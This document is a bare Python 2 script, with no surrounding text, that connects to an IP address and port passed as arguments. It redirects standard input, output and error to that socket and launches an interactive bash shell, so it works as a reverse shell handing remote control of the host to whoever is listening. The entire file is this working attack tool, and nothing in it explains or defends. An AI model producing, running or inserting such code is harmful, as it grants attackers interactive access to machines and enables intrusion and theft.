#!/usr/bin/python2
import sys
from os import dup2
from subprocess import call
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip=sys.argv[1]
port=int(sys.argv[2])
s.connect((ip,port))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
call(["/bin/bash","-i"])
